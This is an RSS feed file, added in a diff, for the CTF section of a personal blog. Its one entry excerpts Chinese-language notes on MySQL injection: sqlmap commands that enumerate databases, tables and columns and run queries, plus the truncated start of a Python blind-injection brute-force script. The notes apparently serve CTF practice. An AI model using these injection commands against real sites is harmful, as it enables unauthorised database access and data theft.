@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CTFs on WNCBB&#39;s blog</title>
+    <link>https://wncbb.github.io/ctf/</link>
+    <description>Recent content in CTFs on WNCBB&#39;s blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 19 Aug 2021 21:54:55 +0800</lastBuildDate><atom:link href="https://wncbb.github.io/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Mysql</title>
+      <link>https://wncbb.github.io/ctf/mysql/</link>
+      <pubDate>Thu, 19 Aug 2021 21:54:55 +0800</pubDate>
+      
+      <guid>https://wncbb.github.io/ctf/mysql/</guid>
+      <description>SQLMap 直接使用sqlmap
+// 判断注入点 // GET请求 sqlmap.py -u http://host:port/?id=1 // POST请求 sqlmap.py -u http://host:port/ --data id=1 // 获取当前数据库名 sqlmap.py -u http://host:port/?id=1 –-current-db // 获取所有表名 sqlmap.py -u http://host:port/?id=1 -D &amp;lt;database name&amp;gt; --tables // 获取某张表所有列名 sqlmap.py -u http://host:port/get --data id=1 -D &amp;lt;database name&amp;gt; -T &amp;lt;table name&amp;gt; --columns // 执行命令 sqlmap.py -u http://host:port/get --data id=1 -D &amp;lt;database name&amp;gt; --sql-query=&amp;quot;select * from xxx;&amp;quot; order by 类型注入点 order by类型注入点
+import requests url = &amp;#34;http://host:port/&amp;#34; params = { &amp;#34;注入字段&amp;#34;: &amp;#34;&amp;#34; } flag = &amp;#34;&amp;#34; # 假设目标长度最长为49 for i in range(1, 50): # ASCII可显示字符的范围为 [32, 127) for j in range(32, 127): #params[&amp;#34;注入字段&amp;#34;] = &amp;#34;if(ascii(mid((select group_concat(table_name) from information_schema.</description>
+    </item>
+    
+  </channel>
+</rss>
